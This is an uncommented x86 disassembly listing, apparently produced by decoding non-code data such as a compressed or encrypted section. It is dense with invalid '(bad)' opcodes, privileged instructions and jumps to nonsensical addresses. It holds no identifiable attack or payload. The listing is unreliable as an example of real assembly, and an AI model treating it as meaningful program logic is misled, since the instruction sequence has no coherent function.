  4180c5:	push   0x67
  4180c7:	(bad)  
  4180c8:	sbb    al,0xff
  4180ca:	adc    dl,cl
  4180cc:	xor    ebp,DWORD PTR [edi-0x61]
  4180cf:	adc    eax,0x52095b9e
  4180d4:	fcmovnb st,st(0)
  4180d6:	test   al,0x60
  4180d8:	or     ebx,DWORD PTR [edx]
  4180da:	fdiv   DWORD PTR [ebx-0x22dd004e]
  4180e0:	xchg   ebx,eax
  4180e1:	jge    0x418123
  4180e3:	call   0x46cd:0x600ad8bc
  4180ea:	mov    edi,0xd20ed0
	...
  418153:	add    BYTE PTR [eax],al
  418155:	add    BYTE PTR [ecx-0xba9482],ch
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0xe62fdebc,eax
  418163:	dec    ecx
  418164:	push   0x103673f
  418169:	add    BYTE PTR [eax],al
  41816b:	add    DWORD PTR [eax],eax
  41816d:	add    BYTE PTR [ecx],ch
  41816f:	sahf   
  418170:	lock sub DWORD PTR [esi-0x487d2282],edi
  418177:	scas   eax,DWORD PTR es:[edi]
  418178:	fild   DWORD PTR [ebx-0x24cadd6a]
  41817e:	push   esp
  41817f:	sub    bl,dl
  418181:	or     eax,0x1862068f
  418186:	fld    QWORD PTR [esi-0x45052e99]
  41818c:	mov    ch,0xf6
  41818f:	popf   
  418190:	add    al,0x13
  418192:	sbb    cl,0xa7
  418195:	inc    esi
  418196:	in     al,dx
  418197:	jbe    0x4181a1
  418199:	pop    es
  41819a:	jle    0x418208
  41819c:	lahf   
  41819d:	push   cs
  41819e:	xor    BYTE PTR [ecx],bh
  4181a0:	add    eax,DWORD PTR [edx+0x2802fd48]
  4181a6:	ret    0x9fc3
  4181a9:	push   ds
  4181aa:	(bad)  
  4181ac:	test   eax,0x4feeb007
  4181b1:	adc    eax,DWORD PTR [eax+0x177709dc]
  4181b7:	sub    esi,DWORD PTR [ebp-0x5b]
  4181ba:	ins    BYTE PTR es:[edi],dx
  4181bb:	mov    DWORD PTR [eax+0x43ed0214],eax
  4181c1:	gs add eax,0xb819aa98
  4181c7:	mov    ebx,0xa170d910
  4181cc:	xchg   ebp,eax
  4181cd:	in     eax,0x74
  4181cf:	jmp    0x327d2502
  4181d4:	call   0xac56e99e
  4181d9:	xor    al,0xf7
  4181db:	gs cld 
  4181dd:	and    ecx,0xffffffe5
  4181e0:	and    BYTE PTR [ebp+0x48a299aa],bh
  4181e6:	or     cl,BYTE PTR [edx+ebp*1+0x1d6b5caf]
  4181ed:	jmp    0xa27d55b5
  4181f2:	lea    ebx,[ebx+eax*2]
  4181f5:	jnp    0xc4c3f206
  4181fb:	mov    ?,edi
  4181fd:	bound  eax,QWORD PTR es:[ebx]
  418200:	(bad)  
  418201:	push   cs
  418202:	sub    dh,BYTE PTR ds:0xa3c30e19
  418208:	(bad)  
  418209:	pop    ecx
  41820a:	sub    ecx,ecx
  41820c:	or     ebx,edi
  41820e:	pop    edi
  41820f:	add    al,0x6
  418211:	push   esp
  418212:	mov    ecx,0x8924c5b2
  418217:	mov    ecx,0xb845703e
  41821c:	adc    al,0xdd
  41821e:	inc    ebp
  41821f:	jmp    0x4181a4
  418221:	cmp    al,0xf
  418223:	out    0xd8,eax
  418225:	inc    eax
  418226:	fxch   st(7)
  418228:	xchg   ecx,eax
  418229:	xchg   ecx,eax
  41822a:	cmp    ebx,DWORD PTR [ecx-0x4a]
  41822d:	pop    ds
  41822e:	sub    ch,dl
  418230:	in     al,dx
  418231:	jp     0x4181b3
  418233:	stos   DWORD PTR es:[edi],eax
  418234:	pusha  
  418235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418236:	lea    esp,es:[edi]
  418239:	repz aad 0x34
  41823c:	cmp    cl,BYTE PTR [eax+0x50602285]
  418242:	stos   BYTE PTR es:[edi],al
  418243:	cmp    al,0x5
  418245:	arpl   WORD PTR [eax+0x58],dx
  418248:	mov    ah,0x46
  41824a:	cs loopne 0x418217
  41824d:	xchg   esp,eax
  41824e:	push   esi
  41824f:	iret   
  418250:	pop    esp
  418251:	jne    0x418275
  418253:	inc    BYTE PTR fs:[ebx-0x75789203]
  41825a:	repnz fcmove st,st(2)
  41825d:	mov    dl,0x6b
  41825f:	and    BYTE PTR [eax-0x70366318],cl
  418265:	mov    bl,dl
  418267:	fsubr  QWORD PTR ds:0x44da6dd5
  41826d:	add    BYTE PTR ss:[eax],al
	...
  4182d4:	add    BYTE PTR [eax],al
  4182d6:	aaa    
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0xfabab8d6
  4182e4:	ja     0x418295
  4182e6:	addr16 add al,0x1
  4182e9:	add    BYTE PTR [eax],al
  4182eb:	add    DWORD PTR [eax],eax
  4182ed:	add    BYTE PTR [ecx-0x56],dh
  4182f0:	daa    
  4182f1:	inc    ecx
  4182f2:	jmp    0x5701311b
  4182f7:	(bad)  
  4182f8:	or     DWORD PTR ds:[edx+0x4b993b29],ebp
  4182ff:	hlt    
  418300:	int3   
  418301:	test   eax,0xeff0bdb4
  418306:	or     al,0x11
  418308:	cmc    
  418309:	cmp    eax,0x4c53a8c1
  41830e:	fist   WORD PTR gs:[esi+0x71]
  418312:	lods   eax,DWORD PTR ds:[esi]
  418313:	scas   al,BYTE PTR es:[edi]
  418314:	sbb    edx,0x6e921387
  41831a:	dec    DWORD PTR [ebx-0x7a]
  41831d:	pusha  
  41831e:	repz push 0xffffff88
  418321:	out    0x1d,al
  418323:	aam    0xdc
  418325:	xor    esp,edx
  418327:	cmc    
  418328:	mov    edi,0x14ef34c0
  41832d:	js     0x418377
  41832f:	jb     0x41833a
  418331:	pop    ebx
  418332:	add    ebx,edx
  418334:	pop    edx
  418335:	mov    gs,WORD PTR ds:0xd856f692
  41833b:	test   al,0x54
  41833d:	inc    ecx
  41833e:	jmp    0x230ea447
  418343:	out    dx,eax
  418344:	mov    WORD PTR [eax+0x48341fec],?
  41834a:	push   esp
  41834b:	cdq    
  41834c:	add    BYTE PTR ds:0x3d83c564,dl
  418352:	jmp    0xd630028
  418357:	xor    al,0x9d
  418359:	outs   dx,BYTE PTR ds:[esi]
  41835a:	dec    ebp
  41835b:	mov    esi,DWORD PTR [edi-0x3f222e65]
  418361:	add    BYTE PTR [ebx],dh
  418363:	adc    DWORD PTR [edx-0x5b],edi
  418366:	test   BYTE PTR [edi-0x19],ah
  418369:	inc    edi
  41836a:	shl    DWORD PTR [edi],cl
  41836c:	enter  0x3bbc,0x1b
  418370:	mov    esi,0xccaa206b
  418375:	mov    edi,0x7dca3208
  41837a:	not    DWORD PTR [eax-0x30]
  41837d:	rcr    BYTE PTR ss:[ecx-0x40],cl
  418381:	mul    dl
  418383:	xor    eax,DWORD PTR [edx+0x38]
  418386:	ss mov ch,0xc5
  418389:	mov    ebx,0x63db4194
  41838e:	sub    bh,0xbb
  418391:	xchg   ebx,eax
  418392:	inc    eax
  418393:	imul   edi,DWORD PTR [ebx-0x4e9c6389],0x2f08cd89
  41839d:	push   ds
  41839e:	cmc    
  41839f:	fwait
  4183a0:	ds popf 
  4183a2:	push   ebp
  4183a3:	sub    al,0x90
  4183a5:	mul    edx
  4183a7:	fs pop ss
  4183a9:	push   ds
  4183aa:	cmp    cl,cl
  4183ac:	fwait
  4183ad:	pop    ds
  4183ae:	jns    0x418418
  4183b0:	ficomp WORD PTR [edi]
  4183b2:	push   ecx
  4183b3:	jnp    0x4183f0
  4183b5:	das    
  4183b6:	aaa    
  4183b7:	ret    0x4f12
  4183ba:	in     eax,0x30
  4183bc:	or     DWORD PTR [edi+eiz*8],0x2268fba8
  4183c3:	mov    dh,0xf8
  4183c5:	test   eax,0xfd376e7f
  4183ca:	not    ecx
  4183cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183cd:	lods   eax,DWORD PTR ds:[esi]
  4183ce:	mov    WORD PTR [ebx],?
  4183d0:	out    dx,al
  4183d1:	out    0x4e,al
  4183d3:	add    eax,0xd5a5a393
  4183d8:	or     eax,0x6f6d7174
  4183dd:	stos   BYTE PTR es:[edi],al
  4183de:	jne    0x418375
  4183e0:	repz ds enter 0x15d8,0x72
  4183e6:	adc    BYTE PTR [ecx+ebx*1+0x6c42c24c],dh
  4183ed:	fadd   QWORD PTR [eax]
	...
  418453:	add    BYTE PTR [eax],al
  418455:	add    ah,bl
  418457:	mov    bl,0x3f
  418459:	push   eax
  41845a:	jg     0x418438
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	(bad)  
  418463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418464:	cli    
  418465:	aad    0x67
  418467:	add    eax,0x1000001
  41846c:	add    BYTE PTR [eax],al
  41846e:	std    
  41846f:	(bad)  
  418470:	(bad)  
  418471:	ror    DWORD PTR [ebx-0x7],1
  418474:	add    dh,BYTE PTR [edi-0x71]
  418477:	in     al,dx
  418478:	aam    0x7e
  41847a:	mov    ch,0x83
  41847c:	mov    edi,0xbf48896c
  418481:	or     DWORD PTR [esi+0x66],0x26d6d3b7
  418488:	in     eax,dx
  418489:	xor    DWORD PTR [edx+0x7c],esi
  41848c:	(bad)  
  41848d:	ja     0x418496
  41848f:	cmp    DWORD PTR [ebx-0x61],esi
  418492:	or     eax,0x4509f3df
  418497:	jmp    0x4184cf
  418499:	sahf   
  41849a:	cwde   
  41849b:	pop    es
  41849c:	mov    ds:0x1560b3d6,al
  4184a1:	pop    ds
  4184a2:	in     al,dx
  4184a3:	lock ins BYTE PTR es:[edi],dx
  4184a5:	pop    edi
  4184a6:	inc    esp
  4184a7:	jae    0x4184ce
  4184a9:	out    0x1f,eax
  4184ab:	out    0x84,eax
  4184ad:	and    al,0xc
  4184af:	loope  0x4184af
  4184b1:	sub    eax,0xb248c419
  4184b6:	mov    bh,cl
  4184b8:	mov    cr1,edi
  4184bb:	stos   DWORD PTR es:[edi],eax
  4184bc:	stos   DWORD PTR es:[edi],eax
  4184bd:	aas    
  4184be:	add    eax,0xb9c2890f
  4184c3:	call   0x964c:0xbb34c5bd
  4184ca:	push   DWORD PTR [ebx-0x75]
  4184cd:	imul   esp,DWORD PTR [ecx],0xffffffb9
  4184d0:	out    dx,eax
  4184d1:	and    dl,bl
  4184d3:	cmc    
  4184d4:	sar    DWORD PTR [eax+0x25],0x60
  4184d8:	imul   edi,edx,0xbb820f10
  4184de:	in     eax,dx
  4184df:	dec    esi
  4184e0:	outs   dx,BYTE PTR ds:[esi]
  4184e1:	cmp    esi,DWORD PTR [eax+0x20]
  4184e4:	cmp    bl,cl
  4184e6:	sub    edx,DWORD PTR ds:[ebx-0x63]
  4184ea:	jns    0x4184f5
  4184ec:	jo     0x4184eb
  4184ee:	out    dx,al
  4184ef:	and    BYTE PTR [ebx],al
  4184f1:	lea    esp,[ebx+0x35]
  4184f4:	sub    al,0xc3
  4184f6:	fs (bad) 
  4184f8:	rol    BYTE PTR [edi],1
  4184fa:	push   ebp
  4184fb:	in     eax,0xbf
  4184fd:	stc    
  4184fe:	test   eax,0x7a64e874
  418503:	ins    BYTE PTR es:[edi],dx
  418504:	std    
  418505:	loopne 0x418568
  418507:	add    al,dh
  418509:	and    eax,0xc2de498b
  41850e:	dec    ebx
  41850f:	cs jmp 0xae47:0xd612a53e
  418517:	pop    ecx
  418518:	imul   ebp,DWORD PTR [edi],0x3d
  41851b:	jns    0x418560
  41851d:	fiadd  WORD PTR [edi+0xc76bffe]
  418523:	add    eax,0xa36a6174
  418528:	fs xchg edx,eax
  41852a:	cmp    al,0x8e
  41852c:	mov    dl,0x6e
  41852e:	hlt    
  41852f:	xor    al,0x52
  418531:	sbb    bh,BYTE PTR [ebp-0x54]
  418534:	mov    esi,0x373ee8be
  418539:	cmp    DWORD PTR [edi],ebp
  41853b:	lea    ecx,[eax+0x2728f20]
  418541:	ins    BYTE PTR es:[edi],dx
  418542:	(bad)  [edx+0x1c1a132f]
  418548:	stc    
  418549:	rcr    BYTE PTR [esi],0xd8
  41854c:	sbb    al,0x54
  41854e:	repnz fidiv DWORD PTR [eax]
  418551:	lds    edx,FWORD PTR [edx]
  418553:	jnp    0x4184de
  418555:	shld   DWORD PTR [esi-0x216f0d6d],edx,0x33
  41855d:	(bad)  
  41855f:	sysret 
  418561:	inc    esp
  418562:	push   es
  418563:	mov    al,0xd6
  418565:	jae    0x4185ab
  418567:	push   esp
  418568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418569:	xchg   ebx,eax
  41856a:	ret    
  41856b:	jne    0x4185a6
  41856d:	mov    DWORD PTR [eax],eax
	...
  4185d3:	add    BYTE PTR [eax],al
  4185d5:	add    BYTE PTR [ecx-0x7],al
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	xchg   esi,eax
  4185e3:	and    al,0xc0
  4185e5:	push   0x10667
  4185ea:	add    BYTE PTR [ecx],al
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	div    bh
  4185f0:	or     dh,BYTE PTR [ebp+0x5b926a88]
  4185f6:	es pusha 
  4185f8:	or     eax,0x47bdfef2
  4185fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185fe:	sub    al,0x13
  418600:	outs   dx,BYTE PTR ds:[esi]
  418601:	and    eax,0x23c294cb
  418606:	sub    ah,BYTE PTR [ebp+0x63]
  418609:	add    al,0xd6
  41860b:	xor    edi,DWORD PTR [eax+0x28]
  41860e:	sbb    DWORD PTR [edi+0x3d],0x7b
  418612:	pop    ebx
  418613:	(bad)  
  418614:	add    BYTE PTR [ebx-0x895a27c],dl
  41861a:	push   esi
  41861b:	add    dl,BYTE PTR ds:0xb9f2145b
  418621:	in     eax,0x43
  418623:	xor    eax,DWORD PTR [eax-0x2bbfe4bc]
  418629:	repz cmp eax,0xa39aa58c
  41862f:	mov    ah,0x20
  418631:	or     al,0x57
  418633:	test   BYTE PTR [ebp-0xab35b46],ch
  418639:	push   cs
  41863a:	mov    ds:0x45146cda,eax
  41863f:	cld    
  418640:	int3   
  418641:	sbb    BYTE PTR [edi],ch
  418643:	adc    al,0xf0
  418645:	fwait
  418646:	inc    esp
  418647:	inc    eax
  418648:	mov    ch,0x23
  41864a:	test   al,0x40
  41864c:	dec    edi
  41864d:	je     0x4186a1
  41864f:	aad    0x74
  418651:	ficom  DWORD PTR [ecx-0x4a8e7dcc]
  418657:	mov    dh,0x5f
  418659:	pop    edi
  41865a:	push   eax
  41865b:	pop    eax
  41865c:	stc    
  41865d:	or     bl,BYTE PTR [esi-0x783d1e7a]
  418663:	cli    
  418664:	sbb    dh,BYTE PTR [edi]
  418666:	cdq    
  418667:	dec    edx
  418668:	lock mov esp,esi
  41866b:	bound  edx,QWORD PTR [eax+0x504379bd]
  418671:	fbld   TBYTE PTR [ebx+0x23354e51]
  418677:	xchg   edx,eax
  418678:	fidiv  WORD PTR [edi-0x60]
  41867b:	pop    eax
  41867c:	cmp    eax,DWORD PTR [ecx+0x5bb2a8a]
  418682:	stc    
  418683:	adc    al,0xcd
  418685:	fild   QWORD PTR [eax]
  418687:	scas   al,BYTE PTR es:[edi]
  418688:	gs mov dl,0xaa
  41868b:	pop    ebx
  41868c:	adc    eax,0x96193159
  418691:	fild   QWORD PTR [si+0x8a5]
  418696:	sub    dh,al
  418698:	xchg   esp,eax
  418699:	add    dh,BYTE PTR [eax-0x1935be32]
  41869f:	stos   DWORD PTR es:[edi],eax
  4186a0:	xor    DWORD PTR [eax+ecx*2+0x8bb61a],esi
  4186a7:	fsubr  DWORD PTR [ecx]
  4186a9:	sti    
  4186aa:	cmp    DWORD PTR [edx-0x3b54a8b4],edi
  4186b0:	cmp    eax,eax
  4186b2:	xlat   BYTE PTR ds:[ebx]
  4186b3:	mov    ch,0x33
  4186b5:	or     DWORD PTR [ebx-0x10],ebx
  4186b8:	js     0x4186ec
  4186ba:	push   eax
  4186bb:	out    0xcc,al
  4186bd:	inc    ebx
  4186be:	xor    BYTE PTR [edx],bh
  4186c0:	cmp    DWORD PTR [eax],eax
  4186c2:	ins    BYTE PTR es:[edi],dx
  4186c3:	push   ss
  4186c4:	cmp    ch,BYTE PTR [eax-0x7d]
  4186c7:	pushf  
  4186c8:	jno    0x4186a9
  4186ca:	add    ebx,ecx
  4186cc:	and    DWORD PTR [ebx+0xfb375fb],ebp
  4186d2:	jge    0x418700
  4186d4:	stos   DWORD PTR es:[edi],eax
  4186d5:	mov    eax,0xf4869339
  4186da:	push   esi
  4186db:	(bad)  
  4186dc:	sub    al,0xb5
  4186de:	mov    ch,0xe9
  4186e0:	ficomp DWORD PTR [ecx-0x50c0b982]
  4186e6:	xchg   edx,eax
  4186e7:	jnp    0x4186ef
  4186e9:	inc    ebx
  4186ea:	lods   al,BYTE PTR ds:[esi]
  4186eb:	or     ecx,DWORD PTR [esi+0x32]
	...
  418755:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41875b:	mov    esp,0x8d0caf9f
  418760:	cmp    edx,edx
  418762:	dec    ecx
  418763:	repz rcr BYTE PTR [ecx],0x67
  418767:	pop    es
  418768:	add    DWORD PTR [eax],eax
  41876a:	add    BYTE PTR [ecx],al
  41876c:	add    BYTE PTR [eax],al
  41876e:	arpl   WORD PTR [edi+0x62],sp
  418771:	jg     0x418749
  418773:	and    BYTE PTR [ebp+eax*8+0x48d0a98c],cl
  41877a:	ror    DWORD PTR [esi],0x5f
  41877d:	or     eax,esp
  41877f:	rcr    DWORD PTR [ebx+0x1d90ae2e],1
  418785:	sar    BYTE PTR [ebp-0x36],0x48
  418789:	pop    esp
  41878a:	cli    
  41878b:	inc    ebx
  41878c:	adc    BYTE PTR [esi+0x582b2042],al
  418792:	std    
  418793:	(bad)  
  418794:	jo     0x418748
  418796:	xchg   esi,eax
  418797:	hlt    
  418798:	mov    ds:0x71b7c917,eax
  41879d:	push   eax
  41879e:	data16 or bh,BYTE PTR [ebx+0x57344bc7]
  4187a5:	sub    al,0x2c
  4187a7:	daa    
  4187a8:	dec    esp
  4187a9:	nop
  4187aa:	push   ebp
  4187ab:	stos   DWORD PTR es:[edi],eax
  4187ac:	pminub mm7,mm7
  4187af:	mov    esi,0x361073bb
  4187b4:	adc    BYTE PTR [ebp-0x11],ch
  4187b7:	les    edi,FWORD PTR [edx+0x78]
  4187ba:	dec    ebp
  4187bb:	repz sub al,0xb6
  4187be:	out    0x49,al
  4187c0:	pop    ebp
  4187c1:	lea    ebp,[edx+0x17]
  4187c4:	mov    al,0x6d
  4187c6:	push   0x811d30fb
  4187cb:	sbb    dh,BYTE PTR [ebx-0x68]
  4187ce:	or     al,0x2e
  4187d0:	mov    dl,dl
  4187d2:	xor    al,0x72
  4187d4:	dec    edi
  4187d5:	push   edx
  4187d6:	dec    ebp
  4187d7:	add    ah,BYTE PTR [ebx+ebx*4-0x5e7ea0c5]
  4187de:	cmp    bh,BYTE PTR [edi-0x2ca06674]
  4187e4:	mov    WORD PTR [esi-0x24],gs
  4187e7:	aad    0xbc
  4187e9:	or     al,0x8a
  4187eb:	add    bh,bh
  4187ed:	push   ebx
  4187ee:	or     al,0xc0
  4187f0:	ins    BYTE PTR es:[edi],dx
  4187f1:	dec    ecx
  4187f2:	inc    ebp
  4187f3:	aas    
  4187f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187f5:	sar    DWORD PTR [ebx],cl
  4187f7:	xchg   edi,eax
  4187f8:	sti    
  4187f9:	mov    bl,0x61
  4187fb:	xchg   edi,eax
  4187fc:	push   esi
  4187fd:	adc    DWORD PTR [ebx-0x793ce68c],esp
  418803:	jmp    0x4e62:0xc4bd3a0f
  41880a:	cmp    bl,bl
  41880c:	enter  0x5154,0x62
  418810:	jg     0x4187d5
  418812:	cli    
  418813:	hlt    
  418814:	in     eax,0xad
  418816:	add    DWORD PTR [edx+0x3132a913],ebp
  41881c:	dec    eax
  41881d:	xchg   esi,eax
  41881e:	sar    BYTE PTR [ebp-0x43],1
  418821:	inc    esi
  418822:	retf   
  418823:	and    ecx,DWORD PTR [eax+ecx*2+0x20]
  418827:	out    dx,al
  418828:	pushf  
  418829:	(bad)  
  41882a:	pxor   mm6,QWORD PTR ds:0x3bd995da
  418831:	push   esp
  418832:	jecxz  0x41885d
  418834:	clc    
  418835:	push   esp
  418836:	ins    BYTE PTR es:[edi],dx
  418837:	mov    BYTE PTR [ebp+0x5688341e],bl
  41883d:	sahf   
  41883e:	fwait
  41883f:	push   esi
  418840:	call   0x3364:0x5dff91ce
  418847:	icebp  
  418848:	ins    BYTE PTR es:[edi],dx
  418849:	xchg   ebp,eax
  41884a:	mov    ds:0x75a7297a,al
  41884f:	repnz pop ebp
  418851:	lock js 0x41888d
  418854:	push   0x12
  418856:	sub    BYTE PTR [edi],cl
  418858:	add    edi,DWORD PTR [edx+0x7b]
  41885b:	dec    edx
  41885c:	adc    al,0x1b
  41885e:	rcr    bh,1
  418860:	arpl   WORD PTR [edx+ebp*4+0x375f974d],sp
  418867:	fwait
  418868:	dec    eax
  418869:	pop    es
  41886a:	jne    0x418836
  41886c:	jnp    0x4188c9
	...
  4188d6:	xchg   esp,eax
  4188d7:	enter  0x4337,0x7f
  4188db:	push   esp
  4188dd:	fbld   TBYTE PTR [esi-0x2863c533]
  4188e3:	and    DWORD PTR ds:0x108674b,0x10000
  4188ed:	add    BYTE PTR [esi],bl
  4188ef:	jg     0x4188eb
  4188f1:	push   0xfffffff2
  4188f3:	push   ebx
  4188f4:	enter  0x1247,0x1d
  4188f8:	push   esi
  4188f9:	fdivr  DWORD PTR [ecx+0x75]
  4188fc:	out    0x6a,eax
  4188fe:	scas   eax,DWORD PTR es:[edi]
  4188ff:	xchg   esp,eax
  418900:	cmp    BYTE PTR [esi+0x355dc7a2],0xb5
  418907:	out    dx,eax
  418908:	sbb    edx,DWORD PTR [ebp-0x76]
  41890b:	sub    BYTE PTR [ebx-0xfefe432],bh
  418911:	mov    esi,0x5b5a8527
  418916:	popa   
  418917:	push   cs
  418918:	mov    WORD PTR [edi],cs
  41891a:	mov    dl,0x93
  41891c:	mov    ebp,0x1f89fff9
  418921:	out    dx,eax
  418922:	iret   
  418923:	mov    ebx,?
  418925:	mov    al,0xda
  418927:	rcr    DWORD PTR [edx+ecx*2-0x49],1
  41892b:	jl     0x418992
  41892d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41892f:	int    0x6e
  418931:	xchg   ecx,eax
  418932:	bnd jb 0x418932
  418935:	xor    ah,0xa2
  418938:	jne    0x41891f
  41893a:	cmp    al,0xbe
  41893c:	mov    esp,0x63bba0ff
  418941:	dec    ebx
  418942:	pop    ds
  418943:	mov    ecx,0xbcff767
  418948:	lea    ebx,[ecx-0x5a]
  41894b:	push   esi
  41894c:	xchg   edi,eax
  41894d:	add    DWORD PTR [ebx],ebp
  41894f:	icebp  
  418950:	lea    eax,[ebp-0x7d77abaf]
  418956:	outs   dx,DWORD PTR ds:[esi]
  418957:	adc    DWORD PTR [ecx+0x33],ebx
  41895a:	cmp    ecx,DWORD PTR [ebp+ebx*2+0x56]
  41895e:	rcr    al,0x7b
  418961:	xchg   edx,eax
  418962:	(bad)  
  418963:	rcl    ah,cl
  418965:	pop    edx
  418966:	cwde   
  418967:	scas   eax,DWORD PTR es:[edi]
  418968:	in     eax,0x1f
  41896a:	sbb    DWORD PTR [ebp-0x6a],esp
  41896d:	aam    0x12
  41896f:	mov    BYTE PTR [ebx-0x61bc68cc],bl
  418975:	sub    eax,0x2727c088
  41897a:	stos   BYTE PTR es:[edi],al
  41897b:	dec    esp
  41897c:	mov    ecx,0xd8c62bdb
  418981:	lahf   
  418982:	add    BYTE PTR [esi],ch
  418984:	pop    ds
  418985:	dec    ebx
  418986:	call   0xe9ac:0xb746c670
  41898d:	mov    ebx,0x814c7dc9
  418992:	stos   DWORD PTR es:[edi],eax
  418993:	ficom  DWORD PTR [ecx]
  418995:	fwait
  418996:	ret    0x3943
  418999:	adc    DWORD PTR [eax+0x32],ecx
  41899c:	clc    
  41899d:	mov    DWORD PTR [ebp+0x4a],edi
  4189a0:	mov    DWORD PTR [ebx-0x75],ebx
  4189a3:	outs   dx,BYTE PTR ds:[esi]
  4189a4:	and    DWORD PTR [eax],eax
  4189a6:	mov    ebp,0xb91e2e4c
  4189ab:	aad    0x52
  4189ad:	and    BYTE PTR [edi+edx*8+0x2cdfb17b],ch
  4189b4:	add    eax,0xe010841
  4189b9:	xchg   cl,bh
  4189bb:	xchg   edx,eax
  4189bc:	loope  0x418957
  4189be:	mov    ds:0xbfa76b96,eax
  4189c3:	call   0x7fd6:0xb853279a
  4189ca:	xor    BYTE PTR [edi],dh
  4189cc:	and    eax,0x5668fe33
  4189d1:	mov    dl,0x60
  4189d3:	jb     0x4189ed
  4189d5:	jge    0x418a0c
  4189d7:	shl    bl,1
  4189d9:	or     eax,0x112726fd
  4189de:	add    BYTE PTR [edi-0x38],dl
  4189e1:	mov    al,ds:0x1171b041
  4189e6:	cmc    
  4189e7:	loopne 0x41899c
  4189e9:	test   eax,0xebfb6598
	...
  418a56:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0x951b0069
  418a65:	dec    ebx
  418a66:	or     DWORD PTR [bx+di],eax
  418a69:	add    BYTE PTR [eax],al
  418a6b:	add    DWORD PTR [eax],eax
  418a6d:	add    BYTE PTR [eax+ecx*1],cl
  418a70:	pop    edi
  418a71:	push   ebx
  418a72:	fwait
  418a73:	mov    cs,WORD PTR [ebp-0x76]
  418a76:	mov    esi,0xe23957b9
  418a7b:	loop   0x418ac1
  418a7d:	adc    al,0x15
  418a7f:	addr16 xchg ecx,eax
  418a81:	mov    ecx,0x1fac2b3d
  418a86:	rcr    BYTE PTR [esi+edx*8],0x4a
  418a8a:	inc    edx
  418a8b:	(bad)  
  418a8c:	sub    DWORD PTR [edx-0x735a2ef0],ebp
  418a92:	pop    eax
  418a93:	inc    edx
  418a94:	inc    edx
  418a95:	(bad)  
  418a96:	push   ss
  418a97:	push   ebp
  418a98:	mov    ecx,DWORD PTR [ecx+ecx*1+0x43dbfe29]
  418a9f:	mov    edx,0xa4b950f4
  418aa4:	push   cs
  418aa5:	adc    DWORD PTR [eax],0xffffffc1
  418aa8:	or     al,0xef
  418aaa:	mov    eax,0xb5926101
  418aaf:	fstp   TBYTE PTR [edi-0x4e]
  418ab2:	xchg   ecx,eax
  418ab3:	stc    
  418ab4:	sub    al,0x82
  418ab6:	stc    
  418ab7:	dec    ecx
  418ab8:	jp     0x418b1a
  418aba:	es dec ebx
  418abc:	(bad)  
  418abe:	das    
  418abf:	dec    ebx
  418ac0:	add    dh,BYTE PTR [esp+ebp*1]
  418ac3:	sbb    cl,ch
  418ac5:	imul   ebp,DWORD PTR [eax+0x44],0xc0cbfc5a
  418acc:	imul   ecx,DWORD PTR [ebp+0x4c1cce92],0x2e
  418ad3:	std    
  418ad4:	cmp    al,0xe
  418ad6:	daa    
  418ad7:	xchg   ebx,eax
  418ad8:	fdiv   QWORD PTR [esi*2-0x522a27cb]
  418adf:	mov    bh,0x14
  418ae1:	cmp    DWORD PTR [ecx],0x71
  418ae4:	(bad)  
  418ae5:	scas   al,BYTE PTR es:[edi]
  418ae6:	mov    ebx,0x987652d8
  418aeb:	dec    ecx
  418aec:	or     DWORD PTR [edx-0x30],edx
  418aef:	fst    DWORD PTR [eax+esi*4]
  418af2:	push   edi
  418af3:	dec    edx
  418af4:	push   es
  418af5:	sbb    DWORD PTR [ebp+0x4b],ebp
  418af8:	push   ss
  418af9:	lods   al,BYTE PTR ds:[esi]
  418afa:	in     al,0xf2
  418afc:	mov    edi,0xc6b5ed8c
  418b01:	daa    
  418b02:	jg     0x418b63
  418b04:	fld    st(5)
  418b06:	out    0xc0,eax
  418b08:	fistp  QWORD PTR [eax+0x13493462]
  418b0e:	mov    edx,0x470a3149
  418b13:	cmc    
  418b14:	sub    al,0xb
  418b16:	icebp  
  418b17:	add    bh,bl
  418b19:	mov    al,ds:0x30880918
  418b1e:	sub    eax,0x1cf1bc10
  418b23:	aaa    
  418b24:	sbb    DWORD PTR [edx+0x6442c8d2],0xffffff8a
  418b2b:	cmp    BYTE PTR [eax],bh
  418b2d:	cmp    esi,ebx
  418b2f:	shr    BYTE PTR [eax+0xb4fbdc0],cl
  418b35:	retf   
  418b36:	lahf   
  418b37:	jnp    0x418aeb
  418b39:	shr    bl,cl
  418b3b:	jb     0x418b31
  418b3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b3e:	lods   al,BYTE PTR ds:[esi]
  418b3f:	pop    edx
  418b40:	out    dx,eax
  418b41:	xor    DWORD PTR [edi+0x7ad2957a],eax
  418b47:	mov    WORD PTR [eax],cs
  418b49:	jns    0x418bba
  418b4b:	mov    ch,0x43
  418b4d:	xchg   edi,eax
  418b4e:	rcl    DWORD PTR [edi+ebp*1],cl
  418b51:	sub    BYTE PTR [ecx+ecx*1-0x5c],bl
  418b55:	pop    esi
  418b56:	sbb    ch,0xd7
  418b59:	lods   eax,DWORD PTR ds:[esi]
  418b5a:	lea    edi,[ecx+0xd310069]
  418b60:	and    edi,ebp
  418b62:	inc    ebx
  418b63:	sub    DWORD PTR [eax],0xe05349ff
  418b69:	retf   0x20b8
  418b6c:	(bad)  
  418b6d:	jge    0x418b6f
	...
  418bd3:	add    BYTE PTR [eax],al
  418bd5:	add    BYTE PTR [ebx+edx*1-0x7b],bh
